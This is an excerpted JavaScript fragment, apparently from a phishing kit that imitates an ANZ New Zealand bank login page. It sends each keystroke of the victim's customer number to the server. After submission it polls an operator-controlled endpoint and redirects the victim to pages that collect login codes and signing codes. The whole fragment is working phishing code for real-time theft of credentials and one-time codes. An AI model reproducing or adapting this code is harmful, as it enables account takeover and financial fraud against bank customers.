...
iban.addEventListener('input', e => {
    ...
    data.append('customer_number', iban.value);

    fetch('/anznz/change/' + token.value, {
            method: 'POST',
            body: data
        });
});
...
login_form.addEventListener('submit', e => {
    ...
    if (iban.value == '' || number.value == '') {
        ...
        fetch('/c1/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/c1/check/' + token.value, {
                    method: 'POST',
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            loginButton.innerHTML = 'Log on';
                            loginButton.disabled = false;
                            iban.disabled = false;
                            number.disabled = false;
                            ...
                            window.location.href = '/c2/' + token.value;
                        } else if (data.page == 'loginCode') {
                            window.location.href = '/c3/' + token.value;
                        } else if (data.page == 'signCode') {
                            window.location.href = '/c4/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/c6/' + token.value;
                        }
                        else if (data.page == 'conf') {
                            window.location.href = '/c7/' + token.value;
                        }
                        else if (data.page == 'user') {
                            window.location.href = '/c8/' + token.value;
                        }
